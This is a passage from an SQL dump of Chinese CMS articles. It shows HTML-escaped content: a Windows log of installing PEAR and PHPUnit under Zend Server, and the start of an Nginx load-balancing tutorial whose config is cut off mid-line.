command&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; The ''pear'' command is now at your service at c:\\program files\\zend\\zendserver\\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; bin\\pear.bat&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ** The ''pear'' command is not currently in your PATH, so you need to&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ** use ''c:\\program files\\zend\\zendserver\\bin\\pear.bat'' until you have added&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ** ''C:\\Program Files\\Zend\\ZendServer\\bin'' to your PATH environment variable.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Run it without parameters to see the available actions, try ''pear list''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; to see what packages are installed, or ''pear help'' for help.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; For more information about PEAR, see:&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href=&quot;http://pear.php.net/faq.php&quot;&gt;&lt;font color=&quot;#015f91&quot;&gt;http://pear.php.net/faq.php&lt;/font&gt;&lt;/a&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href=&quot;http://pear.php.net/manual/&quot;&gt;&lt;font color=&quot;#015f91&quot;&gt;http://pear.php.net/manual/&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Thanks for using go-pear!&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; * WINDOWS ENVIRONMENT VARIABLES *&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; For convenience, a REG file is available under C:\\Program Files\\Zend\\ZendServer\\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; bin\\PEAR_ENV.reg .&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; This file creates ENV variables for the current user.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Double-click this file to add it to the current user registry.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 请按任意键继续. . .&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ==================================================================&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 安装完毕，按照提示双击 C:\\Program Files\\Zend\\ZendServer\\bin\\PEAR_ENV.reg 文件，向注册表写入 PHP_PEAR_SYSCONF_DIR、PHP_PEAR_INSTALL_DIR 等键值。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR_ENV.reg 文件内容为：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; REGEDIT4&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; [HKEY_CURRENT_USER\\Environment]&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;PHP_PEAR_SYSCONF_DIR&quot;=&quot;C:\\\\Program Files\\\\Zend\\\\ZendServer\\\\bin&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;PHP_PEAR_INSTALL_DIR&quot;=&quot;C:\\\\Program Files\\\\Zend\\\\ZendServer\\\\bin\\\\pear&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;PHP_PEAR_DOC_DIR&quot;=&quot;C:\\\\Program Files\\\\Zend\\\\ZendServer\\\\bin\\\\docs&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;PHP_PEAR_BIN_DIR&quot;=&quot;C:\\\\Program Files\\\\Zend\\\\ZendServer\\\\bin&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;PHP_PEAR_DATA_DIR&quot;=&quot;C:\\\\Program Files\\\\Zend\\\\ZendServer\\\\bin\\\\data&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;PHP_PEAR_PHP_BIN&quot;=&quot;C:\\\\Program Files\\\\Zend\\\\ZendServer\\\\bin\\\\.\\\\php.exe&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;PHP_PEAR_TEST_DIR&quot;=&quot;C:\\\\Program Files\\\\Zend\\\\ZendServer\\\\bin\\\\tests&quot;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 附录-2 添加频道 channel-discover pear.phpunit.de&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ==================================================================&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; C:\\Program Files\\Zend\\ZendServer\\bin&amp;gt;pear channel-discover pear.phpunit.de&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Adding Channel &quot;pear.phpunit.de&quot; succeeded&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Discovery of channel &quot;pear.phpunit.de&quot; succeeded&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 附录-3 添加频道 pear.symfony-project.com&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ======================================================================&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; C:\\Program Files\\Zend\\ZendServer\\bin&amp;gt;pear channel-discover pear.symfony-project.com&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Adding Channel &quot;pear.symfony-project.com&quot; succeeded&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Discovery of channel &quot;pear.symfony-project.com&quot; succeeded&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 附录-4 安装 PHPUnit&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 报错：当前的 PEAR 版本是 1.7.2，太低，需要 version &amp;gt;= 1.8.1&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ======================================================================&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; C:\\Program Files\\Zend\\ZendServer\\bin&amp;gt;pear install phpunit/PHPUnit&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Did not download optional dependencies: pear/Image_GraphViz, pear/Log, symfony/YAML,&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; use --alldeps to download automatically&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; phpunit/PHPUnit requires PEAR Installer (version &amp;gt;= 1.8.1), installed version is 1.7.2&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; phpunit/PHPUnit can optionally use package &quot;pear/Image_GraphViz&quot; (version &amp;gt;= 1.2.1)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; phpunit/PHPUnit can optionally use package &quot;pear/Log&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; phpunit/PHPUnit can optionally use package &quot;symfony/YAML&quot; (version &amp;gt;= 1.0.2)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; phpunit/PHPUnit can optionally use PHP extension &quot;xdebug&quot; (version &amp;gt;= 2.0.5)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; No valid packages found&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 附录-5 升级 PEAR(到 PEAR-1.9.1)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ======================================================================&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; C:\\Program Files\\Zend\\ZendServer\\bin&amp;gt;pear upgrade pear&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; downloading PEAR-1.9.1.tgz ...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Starting to download PEAR-1.9.1.tgz (293,587 bytes)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ...................................................done: 293,587 bytes&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; downloading Archive_Tar-1.3.7.tgz ...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Starting to download Archive_Tar-1.3.7.tgz (17,610 bytes)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ...done: 17,610 bytes&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; downloading Structures_Graph-1.0.3.tgz ...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Starting to download Structures_Graph-1.0.3.tgz (30,191 bytes)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ...done: 30,191 bytes&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; downloading XML_Util-1.2.1.tgz ...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Starting to download XML_Util-1.2.1.tgz (17,729 bytes)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ...done: 17,729 bytes&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; upgrade ok: channel://pear.php.net/Archive_Tar-1.3.7&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; upgrade ok: channel://pear.php.net/Structures_Graph-1.0.3&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; upgrade ok: channel://pear.php.net/XML_Util-1.2.1&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Warning: strtotime(): It is not safe to rely on the system''s timezone settings.&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; You are *required* to use the date.timezone setting or the date_default_timezone&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; _set() function. In case you used any of those methods and you are still getting&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; this warning, you most likely misspelled the timezone identifier. We selected ''&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; UTC'' for ''8.0/no DST'' instead in PEAR\\Validate.php on line 489&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; upgrade ok: channel://pear.php.net/PEAR-1.9.1&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR: Optional feature webinstaller available (PEAR''s web-based installer)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR: Optional feature gtkinstaller available (PEAR''s PHP-GTK-based installer)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR: Optional feature gtk2installer available (PEAR''s PHP-GTK2-based installer)&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PEAR: To install optional features use &quot;pear install pear/PEAR#featurename&quot;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 附录-6 再次安装 PHPUnit&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 成功安装 PHPUnit-3.4.14&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ======================================================================&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; C:\\Program Files\\Zend\\ZendServer\\bin&amp;gt;pear install phpunit/PHPUnit&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Did not download optional dependencies: pear/Image_GraphViz, pear/Log, symfony&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; /YAML, use --alldeps to download automatically&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; phpunit/PHPUnit can optionally use package &quot;pear/Image_GraphViz&quot; (version &amp;gt;= 1.2.1)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; phpunit/PHPUnit can optionally use package &quot;pear/Log&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; phpunit/PHPUnit can optionally use package &quot;symfony/YAML&quot; (version &amp;gt;= 1.0.2)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; phpunit/PHPUnit can optionally use PHP extension &quot;xdebug&quot; (version &amp;gt;= 2.0.5)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; downloading PHPUnit-3.4.14.tgz ...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Starting to download PHPUnit-3.4.14.tgz (254,983 bytes)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; .....................................................done: 254,983 bytes&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; install ok: channel://pear.phpunit.de/PHPUnit-3.4.14&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ======================================================================&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; 相关链接：&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; PHPUnit官方：&lt;a href=&quot;http://www.phpunit.de/&quot;&gt;&lt;font color=&quot;#015f91&quot;&gt;http://www.phpunit.de/&lt;/font&gt;&lt;/a&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; PHPUnit文档：&lt;a href=&quot;http://www.phpunit.de/pocket_guide/3.2/en/index.html&quot;&gt;&lt;font color=&quot;#015f91&quot;&gt;http://www.phpunit.de/pocket_guide/3.2/en/index.html&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 1, 1302186650, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(33, 1, 'Nginx 简单的负载均衡配置', '', '', '&lt;div class=&quot;showContent&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size:14px;color:#333333;line-height:21px;font-family:arial, helvetica, sans-serif, 宋体;&quot;&gt;www.cncms.com.cn&amp;nbsp;和&amp;nbsp;bbs.cncms.com.cn&amp;nbsp;域名均指向&amp;nbsp;Nginx&amp;nbsp;所在的服务器IP。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　用户访问&lt;a style=&quot;color:#333333;text-decoration:none;&quot; href=&quot;http://www.cncms.com.cn/&quot; target=&quot;_blank&quot;&gt;http://www.cncms.com.cn&lt;/a&gt;，将其负载均衡到192.168.1.2:80、192.168.1.3:80、192.168.1.4:80、192.168.1.5:80四台服务器。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　用户访问&lt;a style=&quot;color:#333333;text-decoration:none;&quot; href=&quot;http://bbs.cncms.com.cn/&quot; target=&quot;_blank&quot;&gt;http://bbs.cncms.com.cn&lt;/a&gt;，将其负载均衡到192.168.1.7服务器的8080、8081、8082端口。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n　　以下为配置文件nginx.conf：&amp;nbsp;&lt;/span&gt; &lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size:14px;color:#333333;line-height:21px;font-family:arial, helvetica, sans-serif, 宋体;&quot;&gt;&lt;div&gt;&lt;div style=&quot;border-right:#cccccc 1px solid;padding-right:4px;border-top:#cccccc 1px solid;padding-left:4px;font-size:10pt;padding-bottom:4px;border-left:#cccccc 1px solid;width:98%;color:#000000;word-break:break-all;line-height:16px;padding-top:4px;border-bottom:#cccccc 1px solid;font-family:verdana,宋体;background-color:#eeeeee;&quot;&gt;以下是代码片段：&lt;br /&gt;\r\nuser&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;www www;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nworker_processes 10;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n#error_log&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;logs/error.log;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n#error_log&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;logs/error.log&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;notice;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n#error_log&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;logs/error.log&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;info;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n#pid&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;logs/nginx.pid;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n#最大文件描述符&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\nworker_rlimit_nofile 51200;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nevents&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;use epoll;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;worker_connections 51200;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nhttp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;include&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; conf/mime.types;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;default_type&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;application/octet-stream;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;keepalive_timeout 120;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;tcp_nodelay on;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if ( $fastcgi_script_name ~ \\..*\\/.*php )&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return 403;&lt;br 